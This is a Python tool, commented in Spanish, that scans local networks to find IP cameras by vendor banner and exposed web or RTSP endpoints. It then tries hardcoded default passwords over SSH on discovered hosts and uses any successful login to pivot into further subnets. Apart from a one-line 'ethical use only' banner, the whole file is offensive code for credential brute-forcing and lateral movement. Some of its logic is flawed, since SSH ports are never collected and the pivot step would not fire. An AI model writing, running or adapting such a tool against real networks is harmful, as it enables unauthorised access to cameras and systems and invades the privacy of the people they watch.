import socket
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import netifaces
import re
import ipaddress
from tqdm import tqdm
import nmap
import paramiko
import warnings
from typing import List, Dict, Tuple

warnings.filterwarnings("ignore")

class NetworkScanner:
    def __init__(self):
        self.pivot_hosts = []
        self.credentials = {'admin': ['admin', '12345', 'password'], 'root': ['root', 'admin']}
        self.camera_ports = [80, 443, 554, 37777, 8000, 8080]
        self.known_camera_banners = [
            'axis', 'hikvision', 'd-link', 'tp-link', 
            'dahua', 'foscam', 'vivotek', 'sony', 'bosch'
        ]
    
    def get_local_networks(self) -> List[str]:
        """Obtiene todas las redes locales disponibles"""
        networks = []
        interfaces = netifaces.interfaces()
        
        for interface in interfaces:
            try:
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr_info in addrs[netifaces.AF_INET]:
                        if 'addr' in addr_info and 'netmask' in addr_info:
                            ip = addr_info['addr']
                            netmask = addr_info['netmask']
                            if ip != '127.0.0.1':
                                network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                                networks.append(str(network))
            except:
                continue
                
        return networks
    
    def scan_network(self, network: str) -> List[Dict]:
        """Escanea una red en busca de dispositivos"""
        hosts = []
        nm = nmap.PortScanner()
        
        print(f"\nEscaneando red {network}...")
        nm.scan(hosts=network, arguments='-n -sS -T4 --min-parallelism 100')
        
        for host in tqdm(nm.all_hosts(), desc=f"Analizando hosts en {network}"):
            if nm[host].state() == 'up':
                host_info = {
                    'ip': host,
                    'ports': [],
                    'is_camera': False,
                    'services': []
                }
                
                # Verificar puertos comunes de cámaras
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        if port in self.camera_ports:
                            host_info['ports'].append(port)
                            
                            # Verificar si el servicio parece ser una cámara
                            service = nm[host][proto][port]['name']
                            product = nm[host][proto][port].get('product', '').lower()
                            host_info['services'].append(f"{service} ({product})")
                            
                            if any(banner in product for banner in self.known_camera_banners):
                                host_info['is_camera'] = True
                
                hosts.append(host_info)
        
        return hosts
    
    def deep_scan_camera(self, ip: str, ports: List[int]) -> Dict:
        """Realiza un escaneo profundo de un dispositivo potencialmente cámara"""
        result = {
            'ip': ip,
            'web_interface': False,
            'rtsp_stream': False,
            'onvif': False,
            'credentials_found': False,
            'screenshots': []
        }
        
        # Verificar interfaz web
        for port in [80, 443, 8080]:
            if port in ports:
                try:
                    url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
                    response = requests.get(url, timeout=3, verify=False)
                    
                    if response.status_code == 200:
                        result['web_interface'] = True
                        
                        # Buscar indicadores de cámara
                        content = response.text.lower()
                        if any(banner in content for banner in self.known_camera_banners):
                            result['is_camera'] = True
                            
                        # Intentar capturar pantalla (simulado)
                        result['screenshots'].append(f"{url} (interfaz web encontrada)")
                except:
                    continue
        
        # Verificar RTSP
        if 554 in ports:
            result['rtsp_stream'] = True
            result['screenshots'].append(f"rtsp://{ip}:554/stream (RTSP potencial)")
        
        # Verificar ONVIF
        if 8000 in ports:
            result['onvif'] = True
        
        return result
    
    def find_pivot_hosts(self, hosts: List[Dict]) -> List[Dict]:
        """Identifica hosts potenciales para pivoting"""
        pivot_candidates = []
        
        for host in hosts:
            # Buscar routers, servidores o dispositivos con múltiples interfaces
            if 22 in host['ports']:  # SSH
                host['pivot_reason'] = 'SSH disponible'
                pivot_candidates.append(host)
            elif 3389 in host['ports']:  # RDP
                host['pivot_reason'] = 'RDP disponible'
                pivot_candidates.append(host)
            elif any('http' in srv.lower() and 'router' in srv.lower() for srv in host['services']):
                host['pivot_reason'] = 'Dispositivo de red'
                pivot_candidates.append(host)
        
        return pivot_candidates
    
    def try_pivoting(self, host: Dict) -> List[str]:
        """Intenta descubrir redes adicionales a través de un host pivot"""
        new_networks = []
        
        print(f"\nIntentando pivoting a través de {host['ip']}...")
        
        # Método 1: SSH (si el puerto 22 está abierto)
        if 22 in host['ports']:
            print("Probando acceso SSH...")
            for user in self.credentials:
                for password in self.credentials[user]:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host['ip'], username=user, password=password, timeout=5)
                        
                        # Ejecutar ifconfig/ipconfig para encontrar otras interfaces
                        stdin, stdout, stderr = ssh.exec_command('ifconfig || ipconfig')
                        output = stdout.read().decode()
                        
                        # Buscar direcciones IP en el output
                        ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
                        found_ips = re.findall(ip_pattern, output)
                        
                        for ip in found_ips:
                            if not ip.startswith('127.') and not ip.startswith(host['ip'].split('.')[0]):
                                network = f"{'.'.join(ip.split('.')[:3])}.0/24"
                                if network not in new_networks:
                                    new_networks.append(network)
                                    print(f"Red descubierta a través de pivoting: {network}")
                        
                        ssh.close()
                        break
                    except:
                        continue
        
        return new_networks
    
    def scan_with_pivoting(self, max_depth: int = 2) -> Dict:
        """Escanea la red con capacidad de pivoting"""
        results = {'cameras': [], 'pivots': []}
        networks_to_scan = self.get_local_networks()
        scanned_networks = set()
        
        for depth in range(max_depth):
            new_networks = []
            
            for network in networks_to_scan:
                if network in scanned_networks:
                    continue
                
                scanned_networks.add(network)
                print(f"\n{'='*50}\nEscaneando red: {network} (profundidad {depth})\n{'='*50}")
                
                # Escanear la red actual
                hosts = self.scan_network(network)
                
                # Buscar cámaras
                for host in hosts:
                    if host['is_camera'] or any(p in self.camera_ports for p in host['ports']):
                        camera_details = self.deep_scan_camera(host['ip'], host['ports'])
                        if camera_details['web_interface'] or camera_details['rtsp_stream']:
                            results['cameras'].append(camera_details)
                            print(f"\n[+] Cámara encontrada: {host['ip']}")
                            for screenshot in camera_details['screenshots']:
                                print(f"    - {screenshot}")
                
                # Buscar hosts para pivoting
                pivot_hosts = self.find_pivot_hosts(hosts)
                for pivot in pivot_hosts:
                    results['pivots'].append(pivot)
                    print(f"\n[+] Host pivot encontrado: {pivot['ip']} - {pivot['pivot_reason']}")
                    
                    # Intentar pivoting (solo si no es la última profundidad)
                    if depth < max_depth - 1:
                        discovered_networks = self.try_pivoting(pivot)
                        new_networks.extend(n for n in discovered_networks if n not in scanned_networks)
            
            networks_to_scan = list(set(new_networks))
            if not networks_to_scan:
                break
        
        return results
    
    def generate_report(self, results: Dict):
        """Genera un reporte de los resultados"""
        print("\n" + "="*50)
        print("RESUMEN DEL ESCANEO")
        print("="*50)
        
        print("\n[+] Cámaras encontradas:")
        for camera in results['cameras']:
            print(f"\nIP: {camera['ip']}")
            if camera['web_interface']:
                print(f"Interfaz web: http://{camera['ip']}")
            if camera['rtsp_stream']:
                print(f"Stream RTSP: rtsp://{camera['ip']}:554/stream")
            if camera['screenshots']:
                print("Posibles accesos:")
                for ss in camera['screenshots']:
                    print(f" - {ss}")
        
        print("\n[+] Hosts pivot identificados:")
        for pivot in results['pivots']:
            print(f"{pivot['ip']} - {pivot.get('pivot_reason', 'Razón desconocida')}")

def main():
    print("""
    #############################################
    # Escáner Avanzado de Red con Pivoting      #
    # (Solo para uso ético y legal)            #
    #############################################
    """)
    
    scanner = NetworkScanner()
    results = scanner.scan_with_pivoting(max_depth=1)  # Cambiar a 2 para más profundidad
    
    scanner.generate_report(results)
    
    print("\nEscaneo completado.")

if __name__ == "__main__":
    main()
